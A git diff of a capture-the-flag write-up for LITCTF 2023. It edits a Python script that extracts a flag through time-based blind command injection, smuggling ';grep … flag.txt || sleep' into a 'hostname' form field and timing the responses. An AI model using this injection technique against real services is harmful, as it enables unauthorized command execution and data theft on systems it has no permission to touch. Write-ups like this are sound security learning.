@@ -66,13 +66,7 @@ flag = "LITCTF{"
 
 
 #changes with every instance
-url = 'http://34.130.180.82:59880/'
-
-#headers for POST request
-headers = {
-    'Host': url,
-}
-
+url = 'http://34.130.180.82:51636/'
 
 #payload
 data = {
@@ -89,10 +83,10 @@ while True:
         #test prefix
         teststr = flag+x
         #payload
-        injection = f";grep -q {teststr} flag.txt || sleep $(($?*1))"
+        injection = f";grep {teststr} flag.txt || sleep $?"
         data = {'hostname': injection}
         #sending request
-        req = requests.post(url, headers=headers, data=data)
+        req = requests.post(url, data=data)
         #check how long it took
         if req.elapsed.total_seconds() < 1:
             #found the correct char
@@ -105,8 +99,8 @@ while True:
     print(flag)
     #exits ones flag is found
     if(bestchr == '}'): break
-
 ```
+<img width="136" alt="Screen Shot 2023-08-10 at 8 29 03 AM" src="https://github.com/EnchLolz/LITCTF23/assets/96092648/55116b60-9d03-4e26-9ed4-70f50cdb6a7f">
 
 After a while of using this program
 I was able to retrieve the flag
